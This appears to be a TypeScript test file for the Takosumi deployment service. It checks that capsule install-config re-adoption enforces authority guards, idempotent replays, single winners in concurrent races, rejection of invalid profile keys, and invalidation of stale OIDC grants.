  const unbound = interfaces.find(
    (entry) =>
      entry.metadata.materializedFrom?.source === "capsule_blueprint" &&
      entry.metadata.materializedFrom.key === "unbound-status",
  );
  expect(unbound?.status).toMatchObject({
    phase: "Resolved",
    resolvedInputs: { state: "available" },
  });
  expect(
    await operations.interfaces.listBindings(unbound!.metadata.id),
  ).toEqual([]);

  await operations.capsules.putInstallConfig({
    ...seeded.installConfig,
    id: "icfg_repo_interface_conflict",
    interfaceBlueprints: [
      {
        ...previewConfig.interfaceBlueprints![0]!,
        spec: {
          ...previewConfig.interfaceBlueprints![0]!.spec,
          document: { launcher: false },
        },
      },
    ],
  });
  const conflict = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface-conflict",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: "icfg_repo_interface_conflict",
      },
    },
    400,
  );
  expect(conflict.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_interface_blueprint_conflict",
    },
  });
  expect(
    (await operations.capsules.listCapsules(seeded.workspace.id)).some(
      (entry) => entry.name === "repo-interface-conflict",
    ),
  ).toBe(false);
});

const TAKOS_PUBLIC_ORIGIN =
  "https://takos-production-v1.shoutatomiyama0614.workers.dev";
const TAKOS_CALLBACK_PATH = "/auth/oidc/callback";
const TAKOS_SCOPES = [
  "openid",
  "profile",
  "email",
  "offline_access",
  "capsules:read",
  "capsules:write",
] as const;

async function reAdoptionRouteFixture(
  suffix: string,
  options: { readonly legacyProfile?: boolean } = {},
) {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const foreignCookie = seedSession(accountStore, `foreign_${suffix}`);
  const deployStore = new InMemoryOpenTofuControlStore();
  const baseRunner = recordingRunner();
  const runner: RecordingRunner = {
    ...baseRunner,
    readCapsuleSourceFiles: (job) => {
      baseRunner.capsuleSourceFileJobs.push(job);
      return Promise.resolve([
        {
          path: "main.tf",
          text: `
variable "public_url" {
  type = string
}

terraform {
  required_providers {
    cloudflare = { source = "cloudflare/cloudflare" }
  }
}

output "launch_url" { value = var.public_url }
`,
        },
      ]);
    },
  };
  const repositoryUrl = `https://git.example.com/takos/${suffix}.git`;
  const baseInstallConfig: InstallConfig = {
    id: `cfg_takos_profile_${suffix}`,
    name: `takos-profile-${suffix}`,
    sourceSelector: { url: repositoryUrl, path: "." },
    modulePath: ".",
    variableMapping: {},
    installExperience: {
      projections: [
        {
          kind: "oidc_client",
          variables: {},
          callbackPath: TAKOS_CALLBACK_PATH,
          scopes: TAKOS_SCOPES,
        },
      ],
    },
    accountsOidcModuleVariableMaterialization: {
      contract: "takosumi.accounts-oidc-module-variables/v2",
      resourceNameVariable: "project_name",
      publicUrlVariable: "public_url",
      accountsUrlVariable: "takosumi_accounts_url",
      issuerUrlVariable: "takosumi_accounts_issuer_url",
      clientIdVariable: "takosumi_accounts_client_id",
      redirectUriVariable: "takosumi_accounts_redirect_uri",
      callbackPath: TAKOS_CALLBACK_PATH,
      scopes: TAKOS_SCOPES,
    },
    runtimeBindingMaterialization: {
      contract: "takosumi.runtime-binding-profile/v1",
      runtimeSecretFile: {
        contract: "takosumi.runtime-secret-file/v1",
        envName: "TAKOS_RUNTIME_SECRETS_FILE",
        fileName: "takos-runtime-secrets.json",
        mode: 0o600,
        values: [
          {
            kind: "rsa-key-pair",
            privateName: "PLATFORM_PRIVATE_KEY",
            publicName: "PLATFORM_PUBLIC_KEY",
            modulusLength: 2048,
            hash: "SHA-256",
          },
          {
            kind: "random",
            name: "ENCRYPTION_KEY",
            bytes: 32,
            encoding: "base64",
          },
          {
            kind: "random",
            name: "TAKOS_AGENT_START_TOKEN",
            bytes: 32,
            encoding: "hex",
          },
          {
            kind: "random",
            name: "TAKOS_INTERNAL_API_SECRET",
            bytes: 32,
            encoding: "hex",
          },
        ],
      },
    },
    outputAllowlist: {},
    policy: {
      repositoryInstallUx: {
        requiredManifestApiVersion: "takosumi.com/v2.2",
      },
    },
    store: {
      source: { url: repositoryUrl, path: "." },
      ...(options.legacyProfile
        ? {}
        : {
          deploymentProfile: {
            key: "cloudflare-direct-v1",
            label: { ja: "Cloudflareへ直接配置", en: "Direct Cloudflare" },
            description: {
              ja: "Cloudflareへ配置します。",
              en: "Deploy to Cloudflare.",
            },
            order: 10,
            recommended: true,
          },
        },
      ),
      order: 1,
      surface: "apps",
      kind: "app",
      provider: "Takos ecosystem",
      suggestedName: "takos",
      badge: { ja: "Takos", en: "Takos" },
      name: { ja: "Takos", en: "Takos" },
      description: { ja: "Takos", en: "Takos" },
    },
    createdAt: "2026-08-25T00:00:00.000Z",
    updatedAt: "2026-08-25T00:00:00.000Z",
  };
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
    operatorInstallConfigs: [baseInstallConfig],
  });
  const snapshotId = `snap_re_adoption_${suffix}`;
  const workspaceId = `ws_re_adoption_${suffix}`;
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId,
    sourceId: `src_re_adoption_${suffix}`,
    snapshotId,
    capsuleId: `cap_re_adoption_${suffix}`,
    installConfigId: `icfg_old_derived_${suffix}`,
    sourceUrl: repositoryUrl,
    name: `takos-${suffix}`,
    installConfig: {
      workspaceId,
      modulePath: ".",
      internal: {
        reason: "per_install_overrides",
        sourceSnapshotId: snapshotId,
      },
      variableMapping: { public_url: TAKOS_PUBLIC_ORIGIN },
      installExperience: baseInstallConfig.installExperience,
    },
  });
  await deployStore.putCapsule({
    ...seeded.capsule,
    installingPrincipalId: "user_test",
    status: "active",
  });
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest: `sha256:${"7".repeat(64)}`,
      document: {
        apiVersion: "takosumi.com/v2.2",
        kind: "Repository",
        install: {
          defaultModule: ".",
          modules: {
            ".": {
              inputs: [
                {
                  name: "public_url",
                  source: { kind: "user" },
                  type: "string",
                  required: true,
                  label: { ja: "公開URL", en: "Public URL" },
                },
              ],
            },
          },
        },
      },
    },
  });
  return {
    accountStore,
    cookie,
    foreignCookie,
    deployStore,
    operations,
    seeded,
    baseInstallConfig,
  };
}

async function readReAdoptionGuard(
  fixture: Awaited<ReturnType<typeof reAdoptionRouteFixture>>,
): Promise<string> {
  const response = await controlJson<{
    readonly installConfigReAdoption: { readonly authorityGuard: string };
  }>(
    {
      operations: fixture.operations,
      store: fixture.accountStore,
      cookie: fixture.cookie,
      method: "GET",
      path: `/api/v1/capsules/${fixture.seeded.capsule.id}`,
    },
    200,
  );
  return response.installConfigReAdoption.authorityGuard;
}

function reAdoptionBody(
  fixture: Awaited<ReturnType<typeof reAdoptionRouteFixture>>,
  authorityGuard: string,
) {
  return {
    baseInstallConfigId: fixture.baseInstallConfig.id,
    sourceSnapshotId: fixture.seeded.snapshot.id,
    deploymentProfileKey: "cloudflare-direct-v1",
    reason: "Adopt the reviewed immutable Takos profile",
    expected: { authorityGuard },
  };
}

test("re-adoption uses only the public guard, preserves Takos origin, and does not use the OIDC clock as config authority", async () => {
  const fixture = await reAdoptionRouteFixture("route");
  const previousOidcGrantUpdatedAt =
    Date.parse(fixture.baseInstallConfig.updatedAt) + 60_000;
  await fixture.accountStore.saveOidcClient({
    clientId: "tko_existing_re_adoption_route",
    capsuleId: fixture.seeded.capsule.id,
    namespacePath: "identity.oidc",
    issuerUrl: "https://app.takosumi.com",
    redirectUris: [`${TAKOS_PUBLIC_ORIGIN}${TAKOS_CALLBACK_PATH}`],
    allowedScopes: TAKOS_SCOPES,
    subjectMode: "pairwise",
    tokenEndpointAuthMethod: "none",
    createdAt: previousOidcGrantUpdatedAt - 60_000,
    updatedAt: previousOidcGrantUpdatedAt,
  });
  expect(
    (await fixture.operations.capsules.listSharedInstallConfigs({
      includeInternal: false,
    })).map((config) => config.id),
  ).toContain(fixture.baseInstallConfig.id);
  const { source } = await fixture.operations.getSource(
    fixture.seeded.source.id,
  );
  const snapshot = await fixture.operations.getSourceSnapshot(
    fixture.seeded.snapshot.id,
  );
  expect(
    resolveRepoOwnedDeploymentProfile({
      source,
      sourceSnapshot: snapshot,
      candidates: await fixture.operations.capsules.listSharedInstallConfigs({
        includeInternal: false,
      }),
      deploymentProfileKey: "cloudflare-direct-v1",
    }),
  ).toMatchObject({
    ok: true,
    kind: "profile",
    installConfig: { id: fixture.baseInstallConfig.id },
  });
  const path = `/api/v1/capsules/${fixture.seeded.capsule.id}`;
  const unauthenticated = request("GET", path);
  expect(
    (
      await handleControlRoute({
        request: unauthenticated.request,
        url: unauthenticated.url,
        store: fixture.accountStore,
        operations: fixture.operations,
      })
    )?.status,
  ).toBe(401);
  await controlJson(
    {
      operations: fixture.operations,
      store: fixture.accountStore,
      cookie: fixture.foreignCookie,
      method: "GET",
      path,
    },
    403,
  );

  const authorityGuard = await readReAdoptionGuard(fixture);
  const body = reAdoptionBody(fixture, authorityGuard);
  const adopted = await controlJson<{
    readonly capsule: {
      readonly installConfigId: string;
      readonly updatedAt: string;
    };
    readonly installConfigReAdoption: {
      readonly replayed: boolean;
      readonly targetInstallConfigId: string;
    };
  }>(
    {
      operations: fixture.operations,
      store: fixture.accountStore,
      cookie: fixture.cookie,
      method: "POST",
      path: `${path}/install-config-re-adoptions`,
      headers: { "idempotency-key": "re-adopt-route-v1" },
      body,
    },
    200,
  );
  expect(adopted.installConfigReAdoption.replayed).toBe(false);

  const publicTarget = await controlJson<{
    readonly installConfig: InstallConfig;
  }>(
    {
      operations: fixture.operations,
      store: fixture.accountStore,
      cookie: fixture.cookie,
      method: "GET",
      path: `/api/v1/capsule-configs/${adopted.installConfigReAdoption.targetInstallConfigId}`,
    },
    200,
  );
  expect(publicTarget.installConfig.variableMapping.public_url).toBe(
    TAKOS_PUBLIC_ORIGIN,
  );
  expect(publicTarget.installConfig.installExperience?.projections).toEqual([
    {
      kind: "oidc_client",
      variables: {},
      callbackPath: TAKOS_CALLBACK_PATH,
      scopes: TAKOS_SCOPES,
    },
  ]);
  expect(Date.parse(publicTarget.installConfig.updatedAt)).toBe(
    Date.parse(fixture.baseInstallConfig.updatedAt) + 1,
  );

  await Bun.sleep(5);
  const currentClient = fixture.accountStore.findOidcClient(
    "tko_existing_re_adoption_route",
  );
  if (!currentClient) throw new Error("seeded OIDC client is missing");
  await fixture.accountStore.saveOidcClient({
    ...currentClient,
    updatedAt: currentClient.updatedAt + 120_000,
  });
  const replay = await controlJson<typeof adopted>(
    {
      operations: fixture.operations,
      store: fixture.accountStore,
      cookie: fixture.cookie,
      method: "POST",
      path: `${path}/install-config-re-adoptions`,
      headers: { "idempotency-key": "re-adopt-route-v1" },
      body,
    },
    200,
  );
  expect(replay.installConfigReAdoption).toMatchObject({
    replayed: true,
    targetInstallConfigId:
      adopted.installConfigReAdoption.targetInstallConfigId,
  });
  expect(
    (
      await fixture.operations.capsules.getInstallConfig(
        adopted.installConfigReAdoption.targetInstallConfigId,
      )
    ).updatedAt,
  ).toBe(publicTarget.installConfig.updatedAt);

  const activity = await controlJson<{
    readonly events: readonly {
      readonly action: string;
      readonly createdAt: string;
      readonly metadata: Readonly<Record<string, unknown>>;
    }[];
  }>(
    {
      operations: fixture.operations,
      store: fixture.accountStore,
      cookie: fixture.cookie,
      method: "GET",
      path: `/api/v1/workspaces/${fixture.seeded.workspace.id}/activity`,
    },
    200,
  );
  const rebound = activity.events.filter(
    (event) => event.action === "capsule.install_config_rebound",
  );
  expect(rebound).toHaveLength(1);
  expect(rebound[0]?.createdAt).toBe(adopted.capsule.updatedAt);
  expect(JSON.stringify(rebound)).not.toContain("token=");

  await controlJson(
    {
      operations: fixture.operations,
      store: fixture.accountStore,
      cookie: fixture.cookie,
      method: "POST",
      path: `${path}/install-config-re-adoptions`,
      headers: { "idempotency-key": "re-adopt-stale-guard" },
      body,
    },
    409,
  );
  await controlJson(
    {
      operations: fixture.operations,
      store: fixture.accountStore,
      cookie: fixture.cookie,
      method: "POST",
      path: `${path}/install-config-re-adoptions`,
      headers: { "idempotency-key": "re-adopt-bad-reason" },
      body: { ...body, reason: "bad\nreason" },
    },
    400,
  );

});

test("re-adoption rejects present invalid deployment profile keys before durable mutation", async () => {
  const invalidProfileKeys = [
    { label: "number", value: 7 },
    { label: "null", value: null },
    { label: "empty", value: "" },
    { label: "whitespace", value: " " },
  ] as const;

  for (const { label, value } of invalidProfileKeys) {
    const fixture = await reAdoptionRouteFixture(`invalid-profile-${label}`);
    const capsuleBefore = await fixture.operations.capsules.getCapsule(
      fixture.seeded.capsule.id,
    );
    const configIdsBefore = (
      await fixture.deployStore.listInstallConfigs(capsuleBefore.workspaceId)
    ).map((config) => config.id).sort();
    const authorityGuard = await readReAdoptionGuard(fixture);

    await controlJson(
      {
        operations: fixture.operations,
        store: fixture.accountStore,
        cookie: fixture.cookie,
        method: "POST",
        path:
          `/api/v1/capsules/${capsuleBefore.id}/install-config-re-adoptions`,
        headers: { "idempotency-key": `re-adopt-invalid-${label}-v1` },
        body: {
          ...reAdoptionBody(fixture, authorityGuard),
          deploymentProfileKey: value,
        },
      },
      400,
    );

    expect(
      await fixture.operations.capsules.getCapsule(capsuleBefore.id),
    ).toMatchObject({
      installConfigId: capsuleBefore.installConfigId,
      updatedAt: capsuleBefore.updatedAt,
    });
    expect(
      (
        await fixture.deployStore.listInstallConfigs(capsuleBefore.workspaceId)
      ).map((config) => config.id).sort(),
    ).toEqual(configIdsBefore);

    const activity = await controlJson<{
      readonly events: readonly { readonly action: string }[];
    }>(
      {
        operations: fixture.operations,
        store: fixture.accountStore,
        cookie: fixture.cookie,
        method: "GET",
        path: `/api/v1/workspaces/${capsuleBefore.workspaceId}/activity`,
      },
      200,
    );
    expect(
      activity.events.filter(
        (event) => event.action === "capsule.install_config_rebound",
      ),
    ).toHaveLength(0);
  }
});

test("re-adoption keeps the omitted deployment profile default idempotent", async () => {
  const fixture = await reAdoptionRouteFixture("omitted-profile", {
    legacyProfile: true,
  });
  const authorityGuard = await readReAdoptionGuard(fixture);
  const { deploymentProfileKey, ...body } = reAdoptionBody(
    fixture,
    authorityGuard,
  );
  expect(deploymentProfileKey).toBe("cloudflare-direct-v1");
  const path =
    `/api/v1/capsules/${fixture.seeded.capsule.id}/install-config-re-adoptions`;
  const call = () =>
    controlJson<{
      readonly installConfigReAdoption: {
        readonly replayed: boolean;
        readonly targetInstallConfigId: string;
      };
    }>(
      {
        operations: fixture.operations,
        store: fixture.accountStore,
        cookie: fixture.cookie,
        method: "POST",
        path,
        headers: { "idempotency-key": "re-adopt-omitted-profile-v1" },
        body,
      },
      200,
    );

  const adopted = await call();
  const replay = await call();
  expect(adopted.installConfigReAdoption.replayed).toBe(false);
  expect(replay.installConfigReAdoption).toMatchObject({
    replayed: true,
    targetInstallConfigId:
      adopted.installConfigReAdoption.targetInstallConfigId,
  });
});

test("concurrent identical re-adoptions produce one audited winner and one canonical replay", async () => {
  const fixture = await reAdoptionRouteFixture("race");
  const authorityGuard = await readReAdoptionGuard(fixture);
  const body = reAdoptionBody(fixture, authorityGuard);
  const path = `/api/v1/capsules/${fixture.seeded.capsule.id}/install-config-re-adoptions`;
  const call = () =>
    controlJson<{
      readonly installConfigReAdoption: {
        readonly replayed: boolean;
        readonly targetInstallConfigId: string;
      };
    }>(
      {
        operations: fixture.operations,
        store: fixture.accountStore,
        cookie: fixture.cookie,
        method: "POST",
        path,
        headers: { "idempotency-key": "re-adopt-race-v1" },
        body,
      },
      200,
    );
  const results = await Promise.all([call(), call()]);
  expect(results.map((result) => result.installConfigReAdoption.replayed).sort())
    .toEqual([false, true]);
  expect(
    new Set(
      results.map(
        (result) => result.installConfigReAdoption.targetInstallConfigId,
      ),
    ).size,
  ).toBe(1);

  const activity = await controlJson<{
    readonly events: readonly { readonly action: string }[];
  }>(
    {
      operations: fixture.operations,
      store: fixture.accountStore,
      cookie: fixture.cookie,
      method: "GET",
      path: `/api/v1/workspaces/${fixture.seeded.workspace.id}/activity`,
    },
    200,
  );
  expect(
    activity.events.filter(
      (event) => event.action === "capsule.install_config_rebound",
    ),
  ).toHaveLength(1);
});

test("busy old Apply cannot carry an orphan target OIDC grant across re-adoption epoch", async () => {
  const fixture = await reAdoptionRouteFixture("oidc-orphan");
  const capsule = await fixture.operations.capsules.getCapsule(
    fixture.seeded.capsule.id,
  );
  const oldConfig = await fixture.operations.capsules.getInstallConfig(
    capsule.installConfigId,
  );
  const clientId = "tko_re_adoption_oidc_orphan";
  const oldActivationDigest = await oidcClientActivationDigest({
    workspaceId: capsule.workspaceId,
    capsuleId: capsule.id,
    executionAuthorityEpoch: 1,
    installConfig: oldConfig,
  });
  const initialClientUpdatedAt = Date.parse(oldConfig.updatedAt) + 30_000;
  await fixture.accountStore.saveOidcClient({
    clientId,
    capsuleId: capsule.id,
    activationDigest: oldActivationDigest,
    namespacePath: "identity.oidc",
    issuerUrl: "https://app.takosumi.com",
    redirectUris: [`${TAKOS_PUBLIC_ORIGIN}${TAKOS_CALLBACK_PATH}`],
    allowedScopes: TAKOS_SCOPES,
    subjectMode: "pairwise",
    tokenEndpointAuthMethod: "none",
    createdAt: initialClientUpdatedAt - 1,
    updatedAt: initialClientUpdatedAt,
  });

  const runningApply: ApplyRun = {
    id: "apply_re_adoption_oidc_orphan",
    planRunId: "plan_re_adoption_oidc_orphan",
    workspaceId: capsule.workspaceId,
    capsuleId: capsule.id,
    operation: "update",
    runnerProfileId: "opentofu-default",
    status: "running",
    expected: {
      planRunId: "plan_re_adoption_oidc_orphan",
      capsuleId: capsule.id,
      runnerProfileId: "opentofu-default",
      sourceDigest: `sha256:${"1".repeat(64)}`,
      variablesDigest: `sha256:${"2".repeat(64)}`,
      policyDecisionDigest: `sha256:${"3".repeat(64)}`,
      planDigest: `sha256:${"4".repeat(64)}`,
      planArtifactDigest: `sha256:${"4".repeat(64)}`,
    },
    stateBackend: { kind: "managed", ref: "state" } as never,
    stateLock: { status: "recorded", backendRef: "state" },
    auditEvents: [],
    createdAt: initialClientUpdatedAt,
    updatedAt: initialClientUpdatedAt,
    startedAt: initialClientUpdatedAt,
  };
  await fixture.deployStore.putApplyRun(runningApply);

  const authorityGuard = await readReAdoptionGuard(fixture);
  const body = reAdoptionBody(fixture, authorityGuard);
  const path = `/api/v1/capsules/${capsule.id}/install-config-re-adoptions`;
  await controlJson(
    {
      operations: fixture.operations,
      store: fixture.accountStore,
      cookie: fixture.cookie,
      method: "POST",
      path,
      headers: { "idempotency-key": "re-adopt-oidc-orphan-v1" },
      body,
    },
    409,
  );
  const orphanTargets = (
    await fixture.deployStore.listInstallConfigs(capsule.workspaceId)
  ).filter(
    (config) =>
      config.internal?.reAdoption?.idempotencyKeyHash !== undefined,
  );
  expect(orphanTargets).toHaveLength(1);

  // The old Apply may finish and refresh only the old epoch after the target
  // row exists. A newer clock cannot make that grant valid after re-adoption.
  const oldClient = fixture.accountStore.findOidcClient(clientId);
  if (!oldClient) throw new Error("old OIDC client is missing");
  await fixture.accountStore.saveOidcClient({
    ...oldClient,
    activationDigest: oldActivationDigest,
    updatedAt: oldClient.updatedAt + 120_000,
  });
  await fixture.deployStore.putApplyRun({
    ...runningApply,
    status: "succeeded",
    updatedAt: runningApply.updatedAt + 120_000,
    finishedAt: runningApply.updatedAt + 120_000,
  });

  const rebound = await controlJson<{
    readonly installConfigReAdoption: {
      readonly replayed: boolean;
      readonly targetInstallConfigId: string;
    };
  }>(
    {
      operations: fixture.operations,
      store: fixture.accountStore,
      cookie: fixture.cookie,
      method: "POST",
      path,
      headers: { "idempotency-key": "re-adopt-oidc-orphan-v1" },
      body,
    },
    200,
  );
  expect(rebound.installConfigReAdoption.replayed).toBe(false);
  expect(rebound.installConfigReAdoption.targetInstallConfigId).toBe(
    orphanTargets[0]?.id,
  );
  expect(
    await fixture.operations.capsules.getCapsuleExecutionAuthorityEpoch(
      capsule.id,
    ),
  ).toBe(2);

  expect(
    await validateOidcLiveGrant({
      store: fixture.accountStore,
      operations: fixture.operations,
      client: {
        clientId,
        capsuleId: capsule.id,
        allowedScopes: TAKOS_SCOPES,
      },
      capsuleId: capsule.id,
      workspaceId: capsule.workspaceId,
      scope: TAKOS_SCOPES.join(" "),
      takosumiSubject: "user_test",
    }),
  ).toEqual({ ok: false, reason: "install_grant_stale" });
  expect(fixture.accountStore.findOidcClient(clientId)?.updatedAt).toBe(
    oldClient.updatedAt + 120_000,
  );
});
